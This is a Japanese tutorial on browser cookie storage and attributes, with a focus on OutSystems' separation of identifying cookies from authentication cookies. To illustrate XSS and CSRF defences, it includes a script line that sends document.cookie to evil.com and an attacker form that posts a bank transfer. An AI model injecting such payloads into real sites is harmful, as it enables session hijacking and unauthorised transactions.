00

Cookieはどこに保存されるか

基本

サーバから届いた Set-Cookie はブラウザの Cookie ストア（Cookie Jar）に保存される。物理的にはブラウザごとのSQLite等のファイルだが、ブラウザは (Name, Domain, Path) でCookieを管理し、リクエスト時に自動で Cookie ヘッダに載せて送る。

🔰 Cookie ストアのイメージ
ブラウザ
└── Cookie ストア（Cookie Jar）
    ├── example.com 用のCookie
    │   ├── sessionId=abc123  (HttpOnly, Secure)
    │   └── theme=dark
    └── other.com 用のCookie
        └── lang=ja

物理: Chrome → Cookies (SQLite)
      Firefox → cookies.sqlite
HTTP — サーバ→ブラウザ→次回リクエスト
// [1回目] サーバが Set-Cookie で発行
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; Path=/; HttpOnly

// [保存] ブラウザの Cookie Jar に格納

// [2回目以降] ブラウザが自動で Cookie ヘッダに載せる
GET /home HTTP/1.1
Cookie: sessionId=abc123
📘 セッションCookieは「メモリ」、永続Cookieは「ディスク」に保存される。Expires/Max-Age 属性が指定されていればディスク（永続）、なければメモリ（セッション）扱い。
01

セッションCookie vs 永続Cookie

基本

Cookieは寿命によって2種類に分かれる。Expires/Max-Age の有無だけで決まる。

項目セッションCookie永続Cookie
保存場所メモリディスク
寿命ブラウザ閉じるまで指定日時まで
属性指定なしExpires または Max-Age 指定
典型用途認証セッションIDRemember Me / テーマ設定
セキュリティ高（短命）中（漏洩窓が長い）
セッションCookie（属性なし）
HTTP — ブラウザ閉じたら消える
Set-Cookie: sessionId=abc123; Path=/; HttpOnly

// → メモリ保存
// → ブラウザ終了で消滅
永続Cookie（Expires/Max-Age あり）
HTTP — ディスクに残る
Set-Cookie: rememberMe=xyz; Max-Age=2592000
Set-Cookie: theme=dark; Expires=Wed, 31 Dec 2026 23:59:59 GMT

// → ディスク保存
// → 指定期間まで残る
⚠️ 最近のChrome/Firefoxは「前回のタブを開く」設定だとセッションCookieも復元する場合がある。サーバ側のセッション無効化（DB側で Expires 管理）に頼る方が確実。
02

OutSystemsの代表的なCookie

中級

OutSystemsプラットフォームは識別と認証を別Cookieに分離している。これが安全設計の鍵。

Cookie名種類役割
osVisitor永続（1年）訪問者を一意に識別。分析・運用ログの主キー
osVisitセッション1回の訪問（ブラウザ起動中）を識別
nr1Users永続Remember Me 用ログイン識別子
nr2Usersセッション認証済みセッショントークン（HttpOnly+Secure）
.ASPXAUTH場合によるASP.NET Forms認証チケット
🔰 ライフサイクルのイメージ
[初回アクセス]
  → osVisitor 発行（永続: 1年） ─── 以後ずっと同じ訪問者として識別
  → osVisit 発行（セッション）   ─── ブラウザ閉じるまで

[ログイン]
  → nr2Users 発行（セッション）  ─── 認証セッショントークン
  → "ログイン状態を保持"ON の場合
     nr1Users 発行（永続）       ─── 次回起動時に自動ログイン

[ブラウザ終了]
  osVisit / nr2Users     → 消滅
  osVisitor / nr1Users   → ディスクに残存

[次回起動]
  osVisitor で「同じ訪問者」と認識
  nr1Users があれば自動ログイン → 新しい nr2Users を発行
📘 分離設計のポイント: 「価値の高いもの（=認証）ほど短命に」。nr2Users はブラウザ閉じれば消えるため、漏洩しても被害ウィンドウが狭い。osVisitor 単体ではログインできないので長期保持しても被害は小さい。
⚠️ osVisitor は本当に必要か？ アプリの業務ロジックでは不要。OutSystemsの分析・運用機能（Service Center / LifeTime / GetCurrentVisitorId 等）の主キーとして使われている。社内業務システムなど分析が重要でない場面では、削除や短期化を選ぶ設計も合理的。
03

Path 属性 — どのURLパスに送るか

基本

Cookie を どのパス配下のリクエストに自動付与するかを制御する。指定しなければ / 相当。

HTTP — Path指定の挙動
Set-Cookie: adminToken=xxx; Path=/admin

// 送信される/されない
GET /admin/users   → Cookie 送信 ✓
GET /admin         → Cookie 送信 ✓
GET /api/data      → Cookie 送信 ✗
GET /              → Cookie 送信 ✗
Path指定送信対象用途
Path=/サイト全体最も一般的（OutSystems標準）
Path=/admin/admin 配下のみ管理画面のCookie分離
Path=/api/v2/api/v2 配下のみAPIバージョン別の分離
現在: After（推奨: Path=/ で統一）
✓ After: Path=/ で全アプリ共通の認証Cookie
複数アプリ間でセッション共有可能
✗ Before: アプリ毎に Path=/AppA, Path=/AppB
→ 同名Cookie が両方残り、サーバ側で混乱
→ 「ログインしたはずなのにログイン状態にならない」事故
04

Domain 属性 — どのドメインに送るか

基本

Cookie を送る対象ドメインの範囲を指定。指定なしなら発行ホストのみに限定される（サブドメインにすら送らない）。

HTTP — Domain指定の挙動
// [属性なし] app.example.com から発行
Set-Cookie: token=xxx; Path=/

  app.example.com    → 送信 ✓
  www.example.com    → 送信 ✗  ← サブドメインにすら送らない

// [Domain=example.com] サブドメイン全部に送る
Set-Cookie: token=xxx; Path=/; Domain=example.com

  app.example.com    → 送信 ✓
  www.example.com    → 送信 ✓
  api.example.com    → 送信 ✓
  other.com          → 送信 ✗
🚨 セキュリティルール: 自ドメインの上位や他ドメインに Domain を設定してもブラウザに拒否される。evil.com から Domain=google.com のCookieは発行不可能。
📘 使い分け: 単一サイトなら指定なしが最もセキュア。複数サブドメインで認証共有したいときだけ Domain=example.com 形式を使う。
05

Expires / Max-Age 属性 — 寿命の指定

基本

Cookieの寿命を指定する2つの方法。両方とも指定するとMax-Ageが優先される（仕様上）。

属性形式特徴
Expires絶対時刻（GMT）クライアント時刻ずれの影響を受ける。古いブラウザ互換
Max-Age相対秒数時刻ずれに強い。仕様上優先される
Max-Age=0即削除Cookie削除のテクニック
Expires（絶対時刻）
HTTP — 古い形式
Set-Cookie: theme=dark;
  Expires=Wed, 31 Dec 2026 23:59:59 GMT

// 値の中にカンマ・スペース・コロン
// → 1行1Cookie ルールが必要な理由
Max-Age（相対秒数 / 推奨）
HTTP — 推奨形式
Set-Cookie: theme=dark; Max-Age=2592000

// 30日間 (2592000秒)
// 時刻ずれに強い

// Cookie削除
Set-Cookie: theme=; Max-Age=0
⚠️ 削除の落とし穴: 削除時は発行時とまったく同じ Path/Domain を指定する必要がある。違うと「古い方は残ったまま、新しい空Cookieが追加される」事故になる。
06

Secure 属性 — HTTPSのみで送信

基本

Secure 付きのCookieはHTTPSリクエストでのみ送信される。HTTP（平文）リクエストでは送られない。

HTTP — Secure属性の挙動
Set-Cookie: sessionId=xxx; Secure; HttpOnly

  https://example.com/   → Cookie 送信 ✓
  http://example.com/    → Cookie 送信 ✗  // 平文では送らない

// Secureなしの場合
Set-Cookie: theme=dark

  https://example.com/   → Cookie 送信 ✓
  http://example.com/    → Cookie 送信 ✓  // 平文でも送る = 盗聴リスク
🚨 認証Cookieには必ず Secure を付ける。これがないと、公衆Wi-Fiなどで中間者攻撃により Cookie が盗聴される。
💡 利用シーン
  • ログインセッションID（nr2Users、JSESSIONID 等）
  • CSRFトークン
  • 個人情報を含む全てのCookie
  • 本番環境ではほぼ全Cookieに付ける
こう見えたら付け忘れの可能性:
  • DevTools の Application → Cookies で Secure 列にチェックがない認証Cookie
  • http:// でアクセスしてもCookieヘッダが送られている
07

HttpOnly 属性 — JavaScriptアクセス禁止

中級

HttpOnly 付きCookieは document.cookie から見えない・操作できない。XSS対策の基本。Cookie 1個ずつに指定する属性で、サイト全体やドメイン単位の設定ではない。

HTTP — Cookie毎に個別指定
Set-Cookie: sessionId=abc; Path=/; HttpOnly         // HttpOnly 付き
Set-Cookie: theme=dark; Path=/                       // 付いていない
Set-Cookie: csrfToken=xyz; Path=/; HttpOnly         // HttpOnly 付き
JavaScript — document.cookieの見え方
// 上記3つのCookieが設定されている状態で:
console.log(document.cookie);
// → "theme=dark"
// sessionId と csrfToken は HttpOnly なので見えない！
🔰 設計の考え方
JavaScript で読み書きする必要があるか?
    │
    ├─ Yes（テーマ設定、UI状態など）
    │     → HttpOnly 付けない
    │
    └─ No（認証トークン、セッションIDなど）
          → HttpOnly 付ける（XSS対策）

「JSから触りたいCookie」と「サーバだけが扱えばいい
Cookie」を意識的に分けるのが基本姿勢
🚨 XSS攻撃シナリオ: 攻撃者が <script>fetch('//evil.com?c='+document.cookie)</script> を仕込んでも、HttpOnly のCookieは読めない。OutSystemsの nr2Users も HttpOnly で守られている。
08

SameSite 属性 — クロスサイト送信制御

中級

他サイトからのリクエスト時にCookieを送るかどうかを制御。CSRF対策の要。現在のブラウザのデフォルトは Lax。

値同一サイト内外部リンクGET外部POST/iframe
Strict送信送信しない送信しない
Lax（デフォルト）送信送信送信しない
None送信送信送信（要Secure）
HTTP — CSRF攻撃のシナリオ
// ユーザは bank.com にログイン済み
// Set-Cookie: token=xxx; SameSite=Lax; Secure; HttpOnly

// 攻撃者の evil.com 上のフォーム
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000000">
</form>

// SameSite=Lax なら → Cookie 送信されず CSRF 失敗 ✓
// SameSite=None なら → Cookie 送信され送金成立 ✗
⚠️ SameSite=None を使う場合は必ず Secure も必須（仕様上の要件）。サードパーティCookie（広告タグ・埋め込みウィジェット等）でのみ使う。
09

Set-Cookie / Cookie ヘッダの構文ルール

中級

サーバ→ブラウザ（Set-Cookie）と、ブラウザ→サーバ（Cookie）で書き方が違う。1つの Set-Cookie ヘッダには1個のCookieしか書けない。

方向ヘッダ名形式属性
サーバ→ブラウザSet-Cookie複数行に分けて送る（1行1Cookie）含む
ブラウザ→サーバCookie1行にセミコロン区切りで詰め込み含まない
✗ NG: 1行に複数Cookie
HTTP — 誤った書き方
// 1個のCookieとして解釈される
Set-Cookie: a=1; b=2

// 結果:
//   Name=a, Value=1
//   "b=2" は未知の属性 → 無視
// b というCookieは作られない！
✓ OK: 複数行に分ける
HTTP — 正しい書き方
Set-Cookie: a=1; Path=/; HttpOnly
Set-Cookie: b=2; Path=/; HttpOnly

// 結果: 2個のCookieが正しく登録される
HTTP — 完全なやり取りの例
// [サーバ→ブラウザ] 複数行で発行（属性付き）
HTTP/1.1 200 OK
Set-Cookie: osVisitor=v123; Path=/; Max-Age=31536000
Set-Cookie: osVisit=s456; Path=/; HttpOnly
Set-Cookie: nr2Users=auth789; Path=/; Secure; HttpOnly; SameSite=Lax

// [ブラウザ→サーバ] 1行に詰め込み（属性なし）
GET /Home HTTP/1.1
Cookie: osVisitor=v123; osVisit=s456; nr2Users=auth789
📘 なぜ「1行1Cookie」か? Expires 属性の値に Wed, 31 Dec 2026 23:59:59 GMT のようにカンマ・スペース・コロンが含まれるから。1行に複数許すとパースできなくなる。
📘 HTTP/2 以降: バイナリで (name, value) ペアを送るので改行は使わないが、「同じ name のフィールドを複数並べる」という構造で同じ意味になる。
10

複数行のSet-Cookieと「後勝ち」ルール

上級

ブラウザはCookieを (Name, Domain, Path) の3つ組をキーとして管理する。同じキーなら後勝ち（上書き）、違えば別物（両方保存）。

状況結果
Name 同じ、Path 同じ、Domain 同じ後勝ち（上書き）
Name 同じ、Path 違う別物（両方保存）
Name 同じ、Domain 違う別物（両方保存）
1個のSet-Cookie内に同属性を二重指定後勝ち（推奨せず）
単純な後勝ち
HTTP — 同じキーは上書き
Set-Cookie: theme=light; Path=/
Set-Cookie: theme=dark; Path=/
Set-Cookie: theme=auto; Path=/

// 結果: theme=auto だけ残る
// (Name, Domain, Path) が同一
⚠️ 落とし穴: Pathが違うと別物
HTTP — 両方残るケース
Set-Cookie: sessionId=AAA; Path=/
Set-Cookie: sessionId=BBB; Path=/admin

// 結果: 両方残る（別物として扱われる）
// /admin リクエスト時:
// Cookie: sessionId=BBB; sessionId=AAA
// → 同名が2個届いてバグの温床に
現在: After（同じPath/Domainで一貫）
✓ After: 発行も削除も Path=/ で統一
→ クリーンに上書き・削除できる
✗ Before: 発行 Path=/admin、削除 Path=/
→ 発行したCookieは残ったまま
→ 空Cookieが新規追加されて両方混在
→ 「ログアウトしたのにログイン状態が続く」事故
⚠️ 送信順序のルール（RFC 6265）: 複数マッチする場合、より具体的な Path のCookieが先に並ぶ。多くのフレームワークは「最初に出現した値」を採用するので、結果として具体的なPathが優先される。ただし実装依存なので注意。
🚨 削除の鉄則: 削除時は発行時とまったく同じ Path/Domain を指定すること。違うと削除されず、空Cookieが追加されるだけになる。
11

識別と認証の分離設計 — なぜ分けるのか

上級

OutSystemsが osVisitor（識別・永続）と nr2Users（認証・セッション）を分けているのは、「最小権限の原則」と「漏洩時の被害最小化」を実装したもの。情報セキュリティの基本原則 defense in depth（多層防御） をCookie層で実現している。

🔰 価値と寿命の非対称設計
                  ┌─── 永続層 (ディスク) ────┐
                  │                          │
   訪問者の識別 ─→│  osVisitor (1年)         │  ← 漏洩しても被害小
                  │  nr1Users (Remember Me)  │  ← 識別のみ
                  └──────────────────────────┘
                                ↓ ↑
                  ┌─── 揮発層 (メモリ) ──────┐
                  │                          │
   現在の認証   ─→│  osVisit                 │  ← ブラウザ閉じれば消滅
                  │  nr2Users                │  ← HttpOnly+Secure
                  │  (HttpOnly+Secure)       │  ← 漏洩窓を最小化
                  └──────────────────────────┘

「長期保持 = 価値が低い」「短期しか持たない = 価値が高い」
攻撃者にとって美味しいCookieほど手に入れにくい設計

理由1: 漏洩時の被害範囲を限定

✗ 悪い設計: 1つに詰め込む
悪例 — 認証も識別も1個に
Set-Cookie: userToken=xxx;
  Max-Age=31536000;
  HttpOnly; Secure

// 認証済み + 識別 + 1年間有効
// 盗まれたら 1年間ずっと
// 「ログイン済みのそのユーザ」として悪用可能
✓ 良い設計: 役割で分離
OutSystems 流 — 分離設計
Set-Cookie: osVisitor=xxx;
  Max-Age=31536000        // 識別だけ
Set-Cookie: nr2Users=yyy;
  HttpOnly; Secure        // 認証/セッション

// nr2Users 盗難 → ブラウザ閉じれば失効
// osVisitor 盗難 → ログインに使えない

理由2: 寿命の要求が真逆

項目識別用 (osVisitor)認証用 (nr2Users)
目的同じ人だと分かるログイン状態を保つ
必要な寿命長いほど良い（再訪追跡・分析）短いほど安全（席を立った隙の悪用防止）
漏洩時のリスク低高
📘 1個にまとめると「長く保ちたい」と「短く切りたい」という矛盾する要求を1つのCookieに押し込むことになり、どっちつかずになる。分離すれば、それぞれの要件を最適に満たせる。

理由3: 機能ごとに独立制御

運用シナリオ — 部分操作が可能
// [ログアウト処理]
nr2Users を削除   → 認証は切れる
osVisitor は残す  → 「ログアウト後の同じ訪問者」として行動分析できる

// [セッションタイムアウト]
nr2Users だけ失効 → 再ログインを要求
osVisitor は維持  → ユーザ体験は途切れない (カート復元、最近見た商品など)

// ["ログイン状態を保持"のON/OFF]
nr1Users (永続認証) を発行する/しない だけで切替
他のCookieには影響しない

理由4: 属性を最適化できる

CookieHttpOnlySecureSameSite寿命
osVisitor（識別）任意推奨Lax1年
nr2Users（認証）必須必須Lax/Strictセッション
✅ まとめ: セキュリティ設計でよく使われる defense in depth（多層防御）の考え方を、Cookieという1つのレイヤの中でも実現している。役割ごとに分離して守りを重ねる、という発想。OutSystemsの認証Cookie設計は、この原則に忠実に従っている。
